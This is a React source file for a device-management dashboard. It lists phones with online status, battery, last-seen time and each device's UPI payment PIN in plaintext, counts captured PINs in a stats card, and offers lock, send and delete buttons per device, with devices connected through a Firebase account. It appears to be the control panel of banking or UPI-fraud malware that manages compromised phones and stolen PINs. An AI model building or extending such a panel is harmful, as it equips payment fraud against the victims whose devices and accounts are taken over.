import React, { useState, useEffect } from 'react';
import { 
  RefreshCw, Search, Smartphone, Wifi, WifiOff, Key,
  Lock, Send, Trash2, FileText, Eye, ChevronDown, Battery, FolderPlus
} from 'lucide-react';
import { getDevices, getDeviceStats, deleteDevice } from '../services/api';

const DevicePanel = ({ user }) => {
  const [devices, setDevices] = useState([]);
  const [stats, setStats] = useState({ total: 0, online: 0, offline: 0, pin: 0 });
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('All');
  const [showCount, setShowCount] = useState(100);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState('');
  const [selectedDevices, setSelectedDevices] = useState([]);

  const fetchData = async () => {
    try {
      setLoading(true);
      const [devicesRes, statsRes] = await Promise.all([
        getDevices(user.id),
        getDeviceStats(user.id)
      ]);
      setDevices(devicesRes.data);
      setStats(statsRes.data);
      setLastUpdated(new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }));
    } catch (err) {
      console.error('Failed to fetch devices:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (user?.id) fetchData();
  }, [user]);

  const handleDeleteDevice = async (deviceId) => {
    if (window.confirm('Are you sure you want to delete this device?')) {
      try {
        await deleteDevice(deviceId);
        fetchData();
      } catch (err) {
        console.error('Failed to delete device:', err);
      }
    }
  };

  const toggleSelectAll = () => {
    if (selectedDevices.length === devices.length) {
      setSelectedDevices([]);
    } else {
      setSelectedDevices(devices.map(d => d.id));
    }
  };

  const filteredDevices = devices.filter(device => {
    const matchesSearch = device.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         device.model?.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesStatus = statusFilter === 'All' || device.status === statusFilter.toLowerCase();
    return matchesSearch && matchesStatus;
  }).slice(0, showCount);

  const StatCard = ({ value, label, icon: Icon, color }) => (
    <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl p-4 sm:p-6 flex flex-col items-center justify-center">
      <Icon className={`w-5 sm:w-6 h-5 sm:h-6 ${color} mb-2`} />
      <span className={`text-2xl sm:text-3xl font-bold ${color}`}>{value}</span>
      <span className="text-gray-500 text-xs uppercase tracking-wider mt-1">{label}</span>
    </div>
  );

  const getBatteryColor = (level) => {
    if (level >= 60) return 'text-green-400 bg-green-500/20';
    if (level >= 30) return 'text-yellow-400 bg-yellow-500/20';
    return 'text-red-400 bg-red-500/20';
  };

  return (
    <div className="space-y-4 sm:space-y-6">
      {/* Stats Cards */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
        <StatCard value={stats.total} label="Total" icon={Smartphone} color="text-blue-400" />
        <StatCard value={stats.online} label="Online" icon={Wifi} color="text-cyan-400" />
        <StatCard value={stats.offline} label="Offline" icon={WifiOff} color="text-red-400" />
        <StatCard value={stats.pin} label="PIN" icon={Key} color="text-yellow-400" />
      </div>

      {/* Filters Bar */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl p-3 sm:p-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 sm:gap-4">
          <div className="flex items-center gap-2 sm:gap-4 flex-wrap">
            {/* Select All Checkbox */}
            <label className="flex items-center gap-2 cursor-pointer">
              <input 
                type="checkbox" 
                checked={selectedDevices.length === devices.length && devices.length > 0}
                onChange={toggleSelectAll}
                className="w-4 h-4 rounded bg-[#1a1a25] border-[#3a3a4a] text-cyan-500 focus:ring-cyan-500/30" 
              />
            </label>
            
            {/* Refresh Button */}
            <button 
              onClick={fetchData}
              className="flex items-center gap-2 px-3 py-1.5 bg-[#1a1a25] border border-[#3a3a4a] rounded-lg text-gray-300 text-sm hover:border-cyan-500/30 transition-colors"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
              <span className="hidden sm:inline">Refresh</span>
            </button>
            
            {/* Status Filter */}
            <div className="flex items-center gap-2">
              <span className="text-gray-500 text-sm hidden sm:inline">Status:</span>
              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
                className="px-2 py-1 bg-[#1a1a25] border border-[#3a3a4a] rounded text-gray-300 text-sm"
              >
                <option value="All">All</option>
                <option value="online">Online</option>
                <option value="offline">Offline</option>
              </select>
            </div>
            
            {/* Show Count */}
            <div className="flex items-center gap-2">
              <span className="text-gray-500 text-sm hidden sm:inline">Show:</span>
              <select
                value={showCount}
                onChange={(e) => setShowCount(Number(e.target.value))}
                className="px-2 py-1 bg-cyan-500/20 border border-cyan-500/30 rounded text-cyan-400 text-sm font-medium"
              >
                <option value={25}>25</option>
                <option value={50}>50</option>
                <option value={100}>100</option>
              </select>
            </div>
          </div>

          <div className="flex items-center gap-2 sm:gap-4">
            <span className="text-gray-500 text-xs sm:text-sm hidden sm:inline">Updated: {lastUpdated}</span>
            <div className="relative flex-1 sm:flex-none">
              <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
              <input
                type="text"
                placeholder="Search..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full sm:w-48 bg-[#1a1a25] border border-[#3a3a4a] rounded-lg pl-10 pr-4 py-1.5 text-gray-300 text-sm placeholder-gray-600 focus:outline-none focus:border-cyan-500/50"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Create Folder Button */}
      <button className="w-full py-3 bg-[#12121a] border border-[#2a2a3a] border-dashed rounded-xl text-gray-400 flex items-center justify-center gap-2 hover:border-cyan-500/30 hover:text-cyan-400 transition-all">
        <FolderPlus className="w-5 h-5" />
        Create Folder
      </button>

      {/* Device List - Mobile Cards / Desktop Table */}
      <div className="block sm:hidden space-y-3">
        {/* Mobile Card View */}
        {filteredDevices.map((device, idx) => (
          <div key={device.id} className="bg-[#12121a] border border-[#2a2a3a] rounded-xl p-4">
            <div className="flex items-start justify-between mb-3">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-full bg-[#1a1a25] flex items-center justify-center text-gray-400 text-sm">
                  {idx + 1}
                </div>
                <div>
                  <p className="text-white font-medium">{device.name}</p>
                  <p className="text-gray-500 text-xs">{device.model}</p>
                </div>
              </div>
              <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                device.status === 'online' 
                  ? 'bg-green-500/20 text-green-400' 
                  : 'bg-red-500/20 text-red-400'
              }`}>
                {device.status === 'online' ? 'Online' : 'Offline'}
              </span>
            </div>
            
            <div className="grid grid-cols-2 gap-2 mb-3 text-sm">
              <div>
                <span className="text-gray-500">UPI PIN: </span>
                {device.upi_pin ? (
                  <span className="text-green-400 font-mono">{device.upi_pin}</span>
                ) : (
                  <span className="text-pink-400">No PIN</span>
                )}
              </div>
              <div>
                <span className="text-gray-500">Battery: </span>
                <span className={`${device.battery >= 60 ? 'text-green-400' : device.battery >= 30 ? 'text-yellow-400' : 'text-red-400'}`}>
                  {device.battery}%
                </span>
              </div>
            </div>
            
            <div className="flex items-center justify-between">
              <span className="text-gray-500 text-xs">{device.last_seen}</span>
              <div className="flex items-center gap-1">
                <button className="w-8 h-8 rounded flex items-center justify-center text-yellow-400 hover:bg-yellow-500/20">
                  <Lock className="w-4 h-4" />
                </button>
                <button className="w-8 h-8 rounded flex items-center justify-center text-blue-400 hover:bg-blue-500/20">
                  <Send className="w-4 h-4" />
                </button>
                <button 
                  onClick={() => handleDeleteDevice(device.id)}
                  className="w-8 h-8 rounded flex items-center justify-center text-red-400 hover:bg-red-500/20"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Desktop Table View */}
      <div className="hidden sm:block bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-[#2a2a3a]">
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">#</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Status</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Device</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">UPI PIN</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Battery</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Last Seen</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Note</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Added</th>
                <th className="px-4 py-3 text-left text-gray-500 text-xs font-semibold uppercase tracking-wider">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredDevices.map((device, idx) => (
                <tr key={device.id} className="border-b border-[#1a1a25] hover:bg-[#15151f] transition-colors">
                  <td className="px-4 py-4">
                    <div className="w-6 h-6 rounded-full bg-[#1a1a25] flex items-center justify-center text-gray-400 text-xs">
                      {idx + 1}
                    </div>
                  </td>
                  <td className="px-4 py-4">
                    <div className="flex items-center gap-2">
                      <Smartphone className="w-4 h-4 text-gray-600" />
                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${
                        device.status === 'online' 
                          ? 'bg-green-500/20 text-green-400' 
                          : 'bg-red-500/20 text-red-400'
                      }`}>
                        <span className={`inline-block w-1.5 h-1.5 rounded-full mr-1.5 ${
                          device.status === 'online' ? 'bg-green-400' : 'bg-red-400'
                        }`}></span>
                        {device.status === 'online' ? 'Online' : 'Offline'}
                      </span>
                    </div>
                  </td>
                  <td className="px-4 py-4">
                    <div>
                      <p className="text-white font-medium">{device.name}</p>
                      <p className="text-gray-500 text-xs">{device.model}</p>
                    </div>
                  </td>
                  <td className="px-4 py-4">
                    {device.upi_pin ? (
                      <span className="px-2 py-1 bg-green-500/20 text-green-400 rounded text-xs font-mono">
                        {device.upi_pin}
                      </span>
                    ) : (
                      <span className="flex items-center gap-1 text-pink-400 text-xs">
                        <Key className="w-3 h-3" />
                        No PIN
                      </span>
                    )}
                  </td>
                  <td className="px-4 py-4">
                    <span className={`flex items-center gap-1 px-2 py-1 rounded text-xs ${getBatteryColor(device.battery)}`}>
                      <Battery className="w-3 h-3" />
                      {device.battery}%
                    </span>
                  </td>
                  <td className="px-4 py-4 text-gray-400 text-sm">{device.last_seen}</td>
                  <td className="px-4 py-4 text-gray-500 text-sm">{device.note || '-'}</td>
                  <td className="px-4 py-4 text-gray-400 text-sm">{device.added}</td>
                  <td className="px-4 py-4">
                    <div className="flex items-center gap-1">
                      <button className="w-7 h-7 rounded flex items-center justify-center text-yellow-400 hover:bg-yellow-500/20 transition-colors">
                        <Lock className="w-3.5 h-3.5" />
                      </button>
                      <button className="w-7 h-7 rounded flex items-center justify-center text-blue-400 hover:bg-blue-500/20 transition-colors">
                        <Send className="w-3.5 h-3.5" />
                      </button>
                      <button 
                        onClick={() => handleDeleteDevice(device.id)}
                        className="w-7 h-7 rounded flex items-center justify-center text-red-400 hover:bg-red-500/20 transition-colors"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                      <button className="w-7 h-7 rounded flex items-center justify-center text-purple-400 hover:bg-purple-500/20 transition-colors">
                        <FileText className="w-3.5 h-3.5" />
                      </button>
                      <button className="w-7 h-7 rounded flex items-center justify-center text-cyan-400 hover:bg-cyan-500/20 transition-colors">
                        <Eye className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {filteredDevices.length === 0 && (
          <div className="p-12 text-center">
            <Smartphone className="w-12 h-12 text-gray-600 mx-auto mb-4" />
            <p className="text-gray-400">{loading ? 'Loading devices...' : 'No devices connected'}</p>
            <p className="text-gray-500 text-sm mt-2">Add Firebase account in Settings to connect devices</p>
          </div>
        )}
      </div>

      {/* Mobile Empty State */}
      {filteredDevices.length === 0 && (
        <div className="block sm:hidden bg-[#12121a] border border-[#2a2a3a] rounded-xl p-8 text-center">
          <Smartphone className="w-12 h-12 text-gray-600 mx-auto mb-4" />
          <p className="text-gray-400">{loading ? 'Loading...' : 'No devices'}</p>
          <p className="text-gray-500 text-sm mt-2">Add Firebase in Settings</p>
        </div>
      )}
    </div>
  );
};

export default DevicePanel;
